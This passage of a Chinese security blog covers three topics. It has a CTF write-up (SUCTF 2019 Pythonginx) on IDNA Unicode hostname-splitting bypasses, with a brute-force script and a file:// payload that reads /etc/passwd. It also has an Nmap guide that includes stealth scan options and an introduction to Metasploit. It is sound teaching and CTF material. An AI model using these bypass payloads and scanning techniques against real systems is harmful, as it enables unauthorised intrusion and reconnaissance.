<p> <strong>xn</strong>：ACE(一个国际化域名编码)，<strong>fiskms</strong>：ASCII码，mua：状态机指令</p>
</blockquote>
<h2 id="域名分割"><a href="#域名分割" class="headerlink" title="域名分割"></a>域名分割</h2><blockquote>
<p>漏洞版本：<strong>IDNA2003</strong> 和 <strong>IDNA2008 + UTS46</strong></p>
</blockquote>
<p>​	先举一个例子，<code>℆</code> 这个字符，若使用python3进行IDNA编码的话，就会变成这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;℆&#x27;</span>.encode(<span class="string">&#x27;idna&#x27;</span>))</span><br><span class="line"><span class="string">b&#x27;c/u&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	然后再进行 UTF-8解码，就变成了 <code>c/u</code></p>
<p>IDNA：Internationalizing Domain Names in Applications，应用程序国际化域名，一种以标准方式处理ASCII以外字符的一种机制，它从Unicode中提取字符，并允许 非ASCII码字符 以允许使用的ASCII字符表示</p>
<p>​	同理在Unicode中有一种字符 <code>℀</code>(U+2100)，当IDNA处理此字符时，会将<code>℀</code>变成a&#x2F;c，所以当你访问此URL时，DNS服务器会自动将URL重定向到另一个网站，如果服务器引用前端URL时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/104/hostsplit-03.jpg" alt="hostsplit-03"></p>
<p>​	<strong>OAuth</strong>：Open Authorization，开放授权，是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/104/hostsplit-04.jpg" alt="hostsplit-04"></p>
<p>​	但实际操作起来没有看起来那么简单，一来是说这个漏洞19年就已经被修复了，二来还有一个乱码的问题(作者说的是一个bug，不过都一样)，当我们输入特殊字符时，就会产生乱码，导致无法正确处理重定向，就像这样：<code>https://evil.cÃ¢ââ¬.dropbox.com/wopi_edit/document1.docx</code></p>
<p><strong>可能的URL分割字符表</strong></p>
<table>
<thead>
<tr>
<th>Unicode编码</th>
<th>符号</th>
</tr>
</thead>
<tbody><tr>
<td>U+2100</td>
<td><code>℀</code></td>
</tr>
<tr>
<td>U+2101</td>
<td><code>℁</code></td>
</tr>
<tr>
<td>U+2105</td>
<td><code>℅</code></td>
</tr>
<tr>
<td>U+2106</td>
<td><code>℆</code></td>
</tr>
<tr>
<td>U+2047</td>
<td><code>⁇</code></td>
</tr>
<tr>
<td>U+2048</td>
<td><code>⁈</code></td>
</tr>
<tr>
<td>U+2049</td>
<td><code>⁉</code></td>
</tr>
<tr>
<td>U+2488</td>
<td><code>⒈</code></td>
</tr>
<tr>
<td>U+FE16</td>
<td><code>︖</code></td>
</tr>
<tr>
<td>U+FE56</td>
<td><code>﹖</code></td>
</tr>
<tr>
<td>U+FE47</td>
<td><code>﹇</code></td>
</tr>
<tr>
<td>U+FF0F</td>
<td><code>／</code></td>
</tr>
<tr>
<td>U+FF1F</td>
<td><code>？</code></td>
</tr>
<tr>
<td>U+FF1A</td>
<td><code>：</code></td>
</tr>
<tr>
<td>U+FE5F</td>
<td><code>﹟</code></td>
</tr>
<tr>
<td>U+FF03</td>
<td><code>＃</code></td>
</tr>
<tr>
<td>U+FE6B</td>
<td><code>﹫</code></td>
</tr>
<tr>
<td>U+FF20</td>
<td><code>＠</code></td>
</tr>
</tbody></table>
<p><strong>[SUCTF 2019]Pythonginx</strong>：</p>
<p>查看下源码得：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>​	判断我们传入的 URL 是否为 suctf.cc(只有第三个 if 判断成功之后才会执行读取文件的操作)，所以我们要绕过前两个 if 条件，虽然判断条件都是一样的，但第二个 if 和 第三个之间有一个 编码解码操作，可以利用其绕过，所以我们要找一个经过编码解码后得到 <code>c</code> 的特殊字符，拼接字符串即可</p>
<p>脚本跑一下：<del>（脚本是偷的）</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unicode</span>():</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni=<span class="built_in">chr</span>(x)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    url=url</span><br><span class="line">    host=parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts=<span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host=parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost=[]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>]=<span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl=urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host=parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p>结果如下：（要是直接复制不行的话，可以用URL编码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>

<p>​	我们可以读一下etc&#x2F;passwd：url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;etc&#x2F;passwd，之后就是查看nginx的配置文件找到flag的路径，读取即可</p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/6070">url中的unicode漏洞引发的域名安全问题</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/51828216">Unicode 和 UTF-8 的区别</a></p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">Blackhat的PPT</a></p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/115451137">SUCTF 2019 Pythonginx</a></p>
]]></content>
      <categories>
        <category>炼气</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap常见用法总结</title>
    <url>/2022/09/30/200%E2%80%94Nmap,SQLmap%E7%94%A8%E6%B3%95(%E6%9C%AA%E5%AE%8C%E6%88%90)/</url>
    <content><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap，一款开源的 网络探测 和 安全审核 工具，可用来 快速扫描大型网络，特点如下：</p>
<ul>
<li>主机探测：探测网络上的主机</li>
<li>端口扫描：探测 目标主机 开放的端口</li>
<li>版本检测：探测 目标主机 的网络服务，判断其服务名称 和 版本号</li>
<li>系统监测：探测 目标主机 的操作系统 和 网络设备的硬件特性</li>
<li>探测脚本</li>
</ul>
<p>扫描格式：nmap+扫描参数+目标地址或网段。略完整的扫描命令：<code>nmap -T4 -A ip</code></p>
<p>​	-A 表示使用 进攻性(Aggressive) 方式扫描，-T4 表示指定扫描过程使用的时序(Timing)，共6个级别(0~5)，级别越高，扫描速度越快，但也易被 防火墙 或 IDS 检测并屏蔽。</p>
<h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p>相关参数：</p>
<ul>
<li><p>-iL：从文件中导入 目标主机 或 目标网段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/kali/Desktop/targets.txt		#扫描 targets.txt文件中的所有目标地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>-exclude：将后面跟着的 主机 或 网段 剔除出扫描范围</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.0.110/24 -exclude 192.168.0.110			 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描除0.110之外的 在此网段中的 所有主机地址，相当于扫描 192.168.0.x（x≠110且在1~255之间）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>-excludefile：同上，不过是以文件的形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp 192.168.0.110/24 -exclude /home/kali/Desktop/notargets.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>–traceroute：路由跟踪扫描，追踪每个路由节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --traceroute www.baidu.com</span><br></pre></td></tr></table></figure>

<p>​	能够了解网络通行情况，通过路由器追踪可以轻松的查处从 我们电脑所在地 到 目标地之间所经过的网络节点，并可以看到通过各个节点所花费的时间</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.0.110			# 扫描单个目标地址（ping扫描）</span><br><span class="line">nmap 192.168.0.110-120		# 扫描一个范围内的目标地址，一个连续的网段中间用 “-” 连接</span><br><span class="line">nmap 192.168.0.110/24		# 扫描目标地址所在的网段，扫描范围为：192.168.0.1~255</span><br></pre></td></tr></table></figure>


<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap 192.168.0.110/24 </span><br><span class="line">……………………</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (12 hosts up) scanned in 1095.08 seconds</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">192.168.0.108 是 kali的 IP，其他的 11 个主机的扫描结果大体类似，就不展示了</span></span><br></pre></td></tr></table></figure>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>相关参数：</p>
<ul>
<li><p>-p：扫描指定端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p 21,22,23,80 192.168.0.110		# 扫描 目标主机 的21、22、23、80 端口</span><br></pre></td></tr></table></figure>
</li>
<li><p>-F：Fast mode，快速模式，仅扫描 TOP100 的端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -F 192.168.0.110		# 扫描 TOP100 的端口</span><br></pre></td></tr></table></figure>
</li>
<li><p>–top-ports number：扫描开放率最高的 number 个端口。Nmap的作者做过大规模的扫描，统计网络上各个端口可能开放的概率，并列出最有可能开放的端口列表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap --top-ports 156 192.168.0.110 </span><br><span class="line">……………………</span><br><span class="line">Not shown: 155 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line">MAC Address: 00:E9:3A:96:10:AB (AzureWave Technology)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​	大部分 扫描器 会对所有端口分为 开放(open) 或 关闭(closed) 两种类型，Nmap对端口状态的分析更加细致分为：开放(open)、关闭(closed)、被过滤(filtered)、未过滤(unfiltered)、开放或被过滤(open|filtered)、关闭或被过滤(closed|filtered)</p>
<ul>
<li>open：渗透测试中最关注的一类端口，往往能够为我们提供一条能够进入系统的攻击路径</li>
<li>closed：主机已相应，但没有应用程序监听。</li>
<li>filtered：不确认 端口 是否开放，可能被 防火墙 等设备过滤</li>
<li>unfiltered：在使用 ACK 扫描时，Nmap 无法确认 端口 是否开放，回归为此类。可以用其他扫描</li>
</ul>
<h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><p>-sV：检测 目标地址 开放的端口对应的服务版本信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -sV  192.168.0.110 </span><br><span class="line">……………………</span><br><span class="line">Not shown: 993 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">80/tcp   open  http            nginx 1.15.11</span><br><span class="line">81/tcp   open  http            nginx 1.15.11</span><br><span class="line">82/tcp   open  http            nginx 1.15.11</span><br><span class="line">83/tcp   open  http            nginx 1.15.11</span><br><span class="line">903/tcp  open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)</span><br><span class="line">3306/tcp open  mysql           MySQL (unauthorized)</span><br><span class="line">5357/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">MAC Address: 00:E9:3A:96:10:AB (AzureWave Technology)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li><p>–version-intensity “level”：设置版本扫描强度，强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别，默认是7</p>
</li>
<li><p>–version-light：打开轻量级模式，为–version-intensity 2的别名</p>
</li>
<li><p>–version-all：尝试所有探测，为–version-intensity 9的别名</p>
</li>
</ul>
<h2 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2><p><strong>脚本分类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- auth: 负责处理鉴权证书（绕开鉴权）的脚本  </span><br><span class="line">- broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </span><br><span class="line">- brute: 提供暴力破解方式，针对常见的应用如http/snmp等  </span><br><span class="line">- default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </span><br><span class="line">- discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  </span><br><span class="line">- dos: 用于进行拒绝服务攻击  </span><br><span class="line">- exploit: 利用已知的漏洞入侵系统  </span><br><span class="line">- external: 利用第三方的数据库或资源，例如进行whois解析  </span><br><span class="line">- fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</span><br><span class="line">- intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</span><br><span class="line">- malware: 探测目标机是否感染了病毒、开启了后门等信息  </span><br><span class="line">- safe: 此类与intrusive相反，属于安全性脚本  </span><br><span class="line">- version: 负责增强服务与版本扫描（Version Detection）功能的脚本  </span><br><span class="line">- vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>-sC ：根据端口识别的服务,调用默认脚本</li>
<li>–script&#x3D;”Lua scripts”：调用的脚本名</li>
<li>–script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]：调用的脚本传递的参数</li>
<li>–script-args-file&#x3D;filename：使用文本传递参数</li>
<li>–script-trace：显示所有发送和接收到的数据</li>
<li>–script-updatedb：更新脚本的数据库</li>
<li>–script-help&#x3D;”Lua script”：显示指定脚本的帮助</li>
</ul>
</blockquote>
<ul>
<li><p>–script&#x3D;vuln：扫描常见漏洞</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/200/Nmap-02.jpg" alt="Nmap-02"></p>
</li>
<li><p>-n –script&#x3D;broadcast：探测局域网内更多服务开启状况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -n --script=broadcast 192.168.0.101</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/200/Nmap-01.png"></p>
</li>
<li><p>–script&#x3D;dns-brute：利用DNS进行子域名暴力破解</p>
<blockquote>
<p>nmap –script&#x3D;dns-brute <a href="http://www.baidu.com/">www.baidu.com</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script=dns-brute www.baidu.com</span><br><span class="line">……………………</span><br><span class="line">Host script results:</span><br><span class="line">| dns-brute: </span><br><span class="line">|   DNS Brute-force hostnames: </span><br><span class="line">|     mx.baidu.com - 61.135.163.61</span><br><span class="line">|     id.baidu.com - 112.34.111.67</span><br><span class="line">|     id.baidu.com - 112.34.111.74</span><br><span class="line">|     id.baidu.com - 112.34.111.75</span><br><span class="line">|     images.baidu.com - 182.61.62.50</span><br><span class="line">|     info.baidu.com - 111.45.3.140</span><br><span class="line">|     info.baidu.com - 112.34.113.75</span><br><span class="line">|     mx1.baidu.com - 111.202.115.85</span><br><span class="line">|     mx1.baidu.com - 220.181.3.85</span><br><span class="line">|     dns.baidu.com - 110.242.68.134</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 43.16 seconds</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="部分参数"><a href="#部分参数" class="headerlink" title="部分参数"></a>部分参数</h2><ul>
<li><p>-sn：Ping Scan，只进行主机发现，不进行端口扫描</p>
</li>
<li><p>-sS：SYN 半连接扫描（TCP SYN）</p>
<blockquote>
<p>使 Nmap 无需通过完整的握手，就能获得远程主机的信息</p>
</blockquote>
</li>
<li><p>-sA：TCP ACK 扫描</p>
</li>
<li><p>-sT：TCP全连接扫描（TCP connect）</p>
</li>
<li><p>-sU：使用UDP扫描（扫描 UDP 开放的端口）</p>
<blockquote>
<p>​	发送UDP数据包到目标主机等待响应，如果返回ICMP不可达的错误消息，说明端口是关闭的；如果得到正确的适当的回应，说明端口是开放的</p>
</blockquote>
</li>
<li><p>-sN&#x2F;sF&#x2F;sX：使用 TCP NULL &#x2F; FIN &#x2F; Xmas scans 秘密扫描 的方式协助探测对方的TCP端口状态</p>
<blockquote>
<p>FIN扫描<strong>不会在目标主机上创建日志</strong>(FIN扫描的优势之一)，FIN扫描发送的包只包含FIN标识</p>
<p>NULL扫描不发送数据包上的任何字节，XMAS扫描发送FIN、PSH和URG标识的数据包</p>
</blockquote>
</li>
<li><p>-O：通过指纹识别技术识别 目标主机 的操作系统的版本（可惜很不准）</p>
</li>
<li><p>-PN：No ping扫描（可以绕过PING命令，但是不影响主机的系统的发现）</p>
<blockquote>
<p>​	如果远程主机有防火墙、IDS和IPS系统，可以使用 -PN 命令来确保不ping远程主机，因为有时候防火墙会阻止掉ping请求，-PN命令告诉 Nmap 不用ping远程主机</p>
</blockquote>
</li>
</ul>
<h3 id="TCP全连接扫描"><a href="#TCP全连接扫描" class="headerlink" title="TCP全连接扫描"></a>TCP全连接扫描</h3><p>​	扫描器 发起一次真实的TCP连接，如果连接成功表明端口是开放的。这种扫描得到的结果最精确，但速度最慢；还容易被 目标主机 记录到日志文件中，易暴露。而 SYN、ACK、FIN 则利用了TCP协议的特性，通过发送一些 包含特殊标志位的数据包，根据返回信息的不同判定端口状态，更加 快速 和 稳定</p>
<h3 id="FIN-扫描"><a href="#FIN-扫描" class="headerlink" title="FIN 扫描"></a>FIN 扫描</h3><ul>
<li>在 TCP 报文结构中，FIN端 标识数据是否传输完毕。若 FIN&#x3D;1，则表示数据发送完成，可以释放连接</li>
<li>当我们发送 FIN&#x3D;1的报文到一个关闭的端口时，该报文会被丢弃，并返回一个 RST报文；</li>
<li>若我们发送给一个开放的端口，该报文只是被丢掉，而不回应消息</li>
<li>不用建立 TCP连接，减少了被目标主机记录的可能，安全性高</li>
</ul>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>通向成神之路的N%之力(中二病犯了)</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit</title>
    <url>/2022/10/17/201%E2%80%94Metasploit%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    <content><![CDATA[<p>​	MSF——Metasploit Framework的简称，是一个安全漏洞利用和测试的工具，集成了常见的 溢出漏洞 和流行的shellcode</p>
<p>目录路径：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;</p>
<p><strong>目录结构</strong></p>
<ul>
<li>data：包含 Metasploit 用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件</li>
<li>documentation：包含框架的可用文档</li>
<li>lib： 库文件夹</li>
<li>plugins：Metasploit 的插件</li>
<li>scripts：Metasploit 的脚本，包括 Meterpreter 及其他脚本</li>
<li>tools：存放多种命令行实用程序</li>
<li>moudles：Metasploit 的模块文件</li>
</ul>
<p><strong>专业术语</strong></p>
<ul>
<li>exploit(渗透攻击)：由攻击者利用系统或应用的安全漏洞进行的攻击行为</li>
<li>payload(攻击载荷)：目标主机被渗透后执行的代码</li>
<li>shellcode(溢出代码)：渗透攻击时作为 payload 运行的一组机器指令，通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行 shell 或者meterpreter shell</li>
<li>module(模块)：在MSF中，一个模块是指MSF框架中所使用的的一段软件代码组件</li>
<li>Listener(监听器)：用来等待连入网络连接的组件。如：在目标主机被渗透之后，他可能同互联网回到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</li>
<li>LHOST：本地主机，攻击机</li>
<li>RHOST：远程主机，目标主机</li>
</ul>
<h1 id="体系框架"><a href="#体系框架" class="headerlink" title="体系框架"></a>体系框架</h1><p>​	Metaspolit 的设计尽可能采用模块化理念，来提升代码复用效率。<strong>基础库文件</strong> 提供了核心框架和一些基础功能的支持；6种类型的 <strong>模块(Modules)</strong> 实现渗透测试功能的主体代码；支持将外部安全工具集成到框架中的 <strong>插件(Plugins)</strong> 机制；通过 <strong>用户接口(Interfaces)</strong> 和 <strong>功能程序(Utilities)</strong> 供渗透测试者使用</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-00.png"></p>
<h2 id="基础性文件-lib"><a href="#基础性文件-lib" class="headerlink" title="基础性文件(lib)"></a>基础性文件(lib)</h2><p>位于 源码目录路径下 的 lib 目录中，包括 Rex、framework-core&#x2F;base 三部分</p>
<ul>
<li>Rex：整个框架所依赖的 最基础的组件，为开发者进行 框架 和 模块 开发提供基础功能的支持</li>
<li>framework-core：负责实现所有与 各种类型的上层模块及插件的 交互接口</li>
<li>framework-base：扩展 core，提供简单的包装例程，用于支持 用户接口 和 功能程序调用框架本身功能及 框架集成模块</li>
</ul>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><ul>
<li><strong>Auxiliares</strong>(辅助模块)：负责执行扫描、嗅探、指纹识别等相关功能</li>
<li><strong>Exploit</strong>(渗透利用模块)：由 攻击者 利用一个系统、应用或服务中的安全漏洞进行的攻击行为。包括 缓冲区溢出、web应用程序攻击 以及 利用配置错误等</li>
<li><strong>Payload</strong>(攻击载荷模块)：主要是攻击成功后在目标机器执行的代码，比如反弹 shell 的代码</li>
<li><strong>Post</strong>(后期渗透)：用于在 取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实行跳板工具等</li>
<li><strong>Encoders</strong>(编码工具)：包含各种编码工具，对payload进行编码加密，从而绕过入侵检测和过滤系统</li>
<li><strong>Evasion</strong>(躲避模块)：用来生成免杀payload</li>
<li><strong>nops</strong>：由于IDS&#x2F;IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串(NOPS x90x90.….)则会因为被拦截而导致攻击失效（ps：IDS：入侵防御系统；IPS：入侵检测系统）</li>
</ul>
<p><strong>search</strong> 命令</p>
<ul>
<li><p>可以用来查找 Metasploit 里的漏洞，用法： <strong>search +关键字</strong>，也可以加一些限制搜索</p>
</li>
<li><p><strong>platform</strong> 限制操作系统、<strong>cve</strong> 限制CVE编号、<strong>type</strong> 搜索目标所属模块</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search platform:windows cve:2009 type:exploit</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看windows系统漏洞中CVE编号为2009的漏洞，并且属于exploit模块</span> </span><br></pre></td></tr></table></figure>

<h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><blockquote>
<p>此步骤并非必要步骤，连接后可以将信息收集的结果导出到工作区</p>
</blockquote>
<ul>
<li><p>首先开启postgresql服务（二者选其一即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start postgresql</span><br><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动 postgresql 后，使用<strong>msfdb init</strong>创建并初始化 msf 数据库，如已配置好会有如下提示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入 <strong>msfconsole</strong> 命令打开 msf 控制台后，用 <strong>db_status</strong> 命令查看数据库连接状态。如果没有连接上，就用下面的命令手动连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_connect db_name:passwd@127.0.0.1/msf</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">db_name:用户名</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">passwd:数据库密码</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">@:固定格式</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">127.0.0.1:登录地址</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">msf:数据库名</span></span><br></pre></td></tr></table></figure>

<p>​	数据库的密码在此文件中：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;config&#x2F;database.yml，数据库密码可以直接复制文件中的密文</p>
</li>
<li><p><strong>workspace</strong>命令查看当前所处工作区，默认只有一个 default 工作区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line">* default	</span><br><span class="line"></span><br><span class="line">workspace -h	   # 查看使用帮助</span><br><span class="line">workspace -a test  # 创建一个 test 工作区</span><br></pre></td></tr></table></figure></li>
</ul>
